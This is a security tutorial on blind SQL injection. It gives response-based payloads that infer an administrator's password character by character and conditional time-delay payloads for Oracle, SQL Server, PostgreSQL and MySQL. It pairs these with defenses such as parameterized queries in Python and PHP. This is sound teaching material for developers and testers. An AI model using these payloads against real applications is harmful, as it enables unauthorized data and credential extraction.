# Blind SQL Injection

Blind SQL Injection is a type of SQL Injection attack where the attacker cannot directly see the results of the SQL queries they execute on the database. Instead, they rely on inference from server responses or response timing to determine if the attack was successful and to gradually extract data. This vulnerability is based on server responses rather than displaying query results, making it a critical and widely known issue.

---

## Types of Blind SQL Injection

### 1. **Based on Server Response**
#### **Detection and Exploitation**
- **Example 1:** Basic detection:
  ```sql
  ' AND '1'='1 --
  ```
  If the response indicates success, proceed with further exploitation.

- **Example 2:** Extracting user information:
  ```sql
  ' AND (SELECT 'a' FROM users WHERE username='administrator')='a --
  ```

- **Example 3:** Extracting password length:
  ```sql
  ' AND LENGTH(password) > 5 --
  ```

- **Example 4:** Extracting password characters:
  ```sql
  ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a --
  ```
  Use the `SUBSTRING(column_name, start_position, length)` function to extract individual characters iteratively.

#### **Protection Measures**
1. **Use Prepared Statements (Parameterized Queries):**
   - **Python (using sqlite3):**
     ```python
     cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
     ```
   - **PHP:**
     ```php
     $pdo = new PDO($dsn, $username, $password, $options);
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
     $stmt->bindParam(':username', $_GET['username'], PDO::PARAM_STR);
     $stmt->execute();
     $user = $stmt->fetch(PDO::FETCH_ASSOC);
     if ($user) {
         echo "User found: " . htmlspecialchars($user['username']);
     } else {
         echo "User not found.";
     }
     ```

2. **Validate and Sanitize Input:**
   - Validate all user inputs to ensure they follow the expected format (e.g., alphanumeric for IDs). Use whitelist validation.

3. **Error Handling:**
   - Avoid revealing database errors in application responses. Instead, provide generic error messages (e.g., "Invalid input").

4. **Least Privilege Principle:**
   - Limit the privileges of the database account used by the web application. Avoid giving excessive permissions like `DROP` or `DELETE`.

---

### 2. **Time Delay-Based Blind SQL Injection**
#### **Why is it Critical?**
Time delay-based attacks can exploit the server’s response time to infer information. Imagine disabling the database of a major site like Facebook for just 15 minutes; the impact could be catastrophic.

#### **Examples**
- **Conditional Time Delays:**
  - **Oracle:**
    ```sql
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;
    ```
  - **Microsoft:**
    ```sql
    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10';
    ```
  - **PostgreSQL:**
    ```sql
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END;
    ```
  - **MySQL:**
    ```sql
    SELECT IF(YOUR-CONDITION-HERE, SLEEP(10), 'a');
    ```

#### **Protection Measures**
1. **Use Prepared Statements:**
   - Prevent user input from altering the SQL structure.

2. **Avoid Vulnerable Functions:**
   - Functions like `SLEEP()` can be manipulated for time-based attacks; avoid using them in user-accessible contexts.

3. **Input Validation and Sanitization:**
   - Validate and sanitize all user inputs to ensure they conform to expected formats.

4. **Web Application Firewall (WAF):**
   - Use a WAF to filter out malicious traffic and SQL Injection attempts.

5. **Error Handling:**
   - Implement proper error handling and log errors securely to prevent exposing sensitive information.

6. **Least Privilege Principle:**
   - Limit database user privileges to minimize the impact of an attack.

---

By understanding and addressing Blind SQL Injection vulnerabilities, developers and security teams can significantly reduce the risk of data breaches and ensure the integrity and confidentiality of their systems.
